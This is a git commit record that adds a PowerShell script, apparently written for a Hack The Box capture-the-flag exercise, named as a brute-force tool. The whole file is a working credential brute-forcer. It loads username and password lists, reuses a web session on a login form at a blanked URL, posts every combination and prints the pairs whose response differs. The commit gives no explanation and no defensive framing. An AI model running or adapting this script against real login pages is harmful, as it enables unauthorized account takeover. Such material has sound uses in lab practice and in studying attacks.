75ac39881d1129ca27f9a47b782d943cfa9dd296
Dennis Ricci <dennisricci85@users.noreply.github.com>
2019-11-18 11:59:30 +0100

    Add files via upload

---
+++ hackthebox/brutforce_learnaen.ps1
@@ -0,0 +1,31 @@
+﻿
+
+$pws = @()
+$users = @()
+
+$pws = Get-Content -Path .\pw.txt
+$users = Get-Content -Path .\users.txt
+
+$url = 'http://___/'
+
+
+$req = Invoke-WebRequest -Uri $url -SessionVariable svb
+
+
+$dbForm = $req.Forms
+
+    
+foreach($user in $users)
+{
+           
+        foreach($pw in $pws)
+        {
+            $dbForm.Fields['password'] = $pw
+            $dbForm.Fields['username'] = $user
+            $r = Invoke-WebRequest -Uri $url -WebSession $svb -Method Post -Body $dbForm.Fields
+            if($r.Content[0] -ne ' '){
+            echo $dbForm.Fields
+            Out-File -FilePath .\ergebnis.txt
+            }
+        }
+}
